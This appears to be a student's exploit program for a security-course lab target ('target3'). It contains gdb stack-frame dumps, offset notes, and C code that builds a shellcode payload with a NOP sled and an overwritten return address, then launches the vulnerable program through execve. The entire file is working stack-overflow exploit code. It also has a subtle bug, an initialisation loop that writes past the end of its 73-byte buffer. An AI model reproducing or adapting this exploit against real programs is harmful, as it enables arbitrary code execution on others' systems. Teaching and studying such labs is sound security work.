#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

/*foo
(gdb) info frame
Stack level 0, frame at 0x2021fe60:
 rip = 0x400ba8 in foo (target3.c:24); saved rip 0x400c49
 called by frame at 0x2021fe90
 source language c.
 Arglist at 0x2021fe50, args: arg=0x7fffffffe2bd "test"
 Locals at 0x2021fe50, Previous frame's sp is 0x2021fe60
 Saved registers:
  rbp at 0x2021fe50, rip at 0x2021fe58
*/
//buf is 0x2021fe10
//arg is 0x2021fe08
//buf to return address is 72 bytes

/* info bar
(gdb) info frame
Stack level 0, frame at 0x2021fe00:
 rip = 0x400b3b in bar (target3.c:10); saved rip 0x400bd9
 called by frame at 0x2021fe60
 source language c.
 Arglist at 0x2021fdf0, args: arg=0x7fffffffe2bd "test",
    targ=0x2021fe10 "AAAA", ltarg=88
 Locals at 0x2021fdf0, Previous frame's sp is 0x2021fe00
 Saved registers:
  rbp at 0x2021fdf0, rip at 0x2021fdf8

*/

//len is at 0x2021fde8
//i is at 0x2021fdec
//targ is at 0x2021fdd0
 

//return address to buffer is 72 bytes



int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	unsigned char tmp[73];
	int i;
	
	for (i=0; i<76; i++){
		tmp[i]= '\x00';
	}

	//save space for "AAAA"

	strcat(tmp,shellcode);
	
	for (i=45;i<72;i++){
		tmp[i] = '\x90';
	}
	
	//since buf starts with "AAAA" (4bytes), so the return address should be at 72-4=68 in tmp.
	tmp[68]='\x10';
	tmp[69]='\xfe';
	tmp[70]='\x21';
	tmp[71]='\x20';
	tmp[72]='\x00';
	

	args[0] = TARGET;
	args[1] = tmp;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
